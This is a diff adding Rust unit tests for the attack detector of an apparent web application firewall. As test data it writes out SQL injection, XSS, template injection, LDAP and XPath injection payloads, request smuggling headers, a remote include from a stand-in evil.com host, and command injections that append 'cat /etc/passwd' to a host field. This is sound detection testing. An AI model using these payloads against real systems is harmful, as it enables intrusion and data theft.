@@ -3659,3 +3659,302 @@ mod acme_workflow_tests {
         assert!(internal.terms_of_service_agreed);
     }
 }
+
+#[cfg(test)]
+mod waf_attack_detection_tests {
+    use http::HeaderMap;
+    use maluwaf::waf::attack_detection::{
+        AttackDetectionConfig, AttackDetector, AttackType, InputLocation,
+    };
+
+    fn create_attack_detector() -> AttackDetector {
+        let config = AttackDetectionConfig::default();
+        AttackDetector::new(config)
+    }
+
+    fn create_high_paranoia_detector() -> AttackDetector {
+        let config = AttackDetectionConfig {
+            paranoia_level: 3,
+            ..AttackDetectionConfig::default()
+        };
+        AttackDetector::new(config)
+    }
+
+    fn make_headers() -> HeaderMap {
+        HeaderMap::new()
+    }
+
+    #[test]
+    fn test_sqli_in_query_string() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("id=1' OR '1'='1"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Sqli));
+        assert!(matches!(
+            result.as_ref().unwrap().input_location,
+            InputLocation::QueryString
+        ));
+    }
+
+    #[test]
+    fn test_sqli_benign_request() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("query=hello+world"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_none());
+    }
+
+    #[test]
+    fn test_xss_in_query_string() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("q=<script>alert(1)</script>"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Xss));
+        assert!(matches!(
+            result.as_ref().unwrap().input_location,
+            InputLocation::QueryString
+        ));
+    }
+
+    #[test]
+    fn test_xss_in_post_body() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/comment",
+            None,
+            &make_headers(),
+            Some(b"<img src=x onerror=alert(1)>"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Xss));
+    }
+
+    #[test]
+    fn test_ssti_smarty() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/template",
+            None,
+            &make_headers(),
+            Some(b"{{7*7}}"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Ssti));
+    }
+
+    #[test]
+    fn test_ssti_jinja2() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/template",
+            None,
+            &make_headers(),
+            Some(b"{{config}}"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Ssti));
+    }
+
+    #[test]
+    fn test_rfi_remote_include() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/include",
+            Some("file=http://evil.com/shell.txt"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Rfi));
+    }
+
+    #[test]
+    fn test_ldap_injection() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("uid=admin)(password=*)"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::LdapInjection
+        ));
+    }
+
+    #[test]
+    fn test_xpath_injection() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("q=admin']or'1'='1"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::XPathInjection
+        ));
+    }
+
+    #[test]
+    fn test_cmd_injection_semicolon() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/ping",
+            Some("host=127.0.0.1; cat /etc/passwd"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::CmdInjection
+        ));
+    }
+
+    #[test]
+    fn test_cmd_injection_pipe() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/ping",
+            Some("host=127.0.0.1 | cat /etc/passwd"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::CmdInjection
+        ));
+    }
+
+    #[test]
+    fn test_request_smuggling_cl() {
+        let detector = create_attack_detector();
+        let mut headers = HeaderMap::new();
+        headers.insert(http::header::CONTENT_LENGTH, "5".parse().unwrap());
+        headers.insert(http::header::TRANSFER_ENCODING, "chunked".parse().unwrap());
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/api",
+            None,
+            &headers,
+            Some(b"0\r\n\r\n"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::RequestSmuggling
+        ));
+    }
+
+    #[test]
+    fn test_body_size_limit() {
+        let mut config = AttackDetectionConfig::default();
+        config.max_request_body_size = Some(10);
+        let detector = AttackDetector::new(config);
+
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/upload",
+            None,
+            &make_headers(),
+            Some(b"this body is way too long for the limit"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Other));
+        assert!(result
+            .as_ref()
+            .unwrap()
+            .fingerprint
+            .as_ref()
+            .unwrap()
+            .starts_with("body_size:"));
+    }
+
+    #[test]
+    fn test_multiple_attacks_first_detected() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("q=<script>alert(1)</script>' OR 1=1--"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_disabled_attack_detection() {
+        let mut config = AttackDetectionConfig::default();
+        config.enabled = false;
+        let detector = AttackDetector::new(config);
+
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("id=1' OR '1'='1"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_none());
+    }
+
+    #[test]
+    fn test_only_sqli_enabled() {
+        let mut config = AttackDetectionConfig::default();
+        config.xss.enabled = false;
+        config.ssti.enabled = false;
+        config.cmd_injection.enabled = false;
+        config.path_traversal.enabled = false;
+        let detector = AttackDetector::new(config);
+
+        let sqli_result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("id=1' OR '1'='1"),
+            &make_headers(),
+            None,
+        );
+        assert!(sqli_result.is_some());
+
+        let xss_result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("q=<script>alert(1)</script>"),
+            &make_headers(),
+            None,
+        );
+        assert!(xss_result.is_none());
+    }
+}
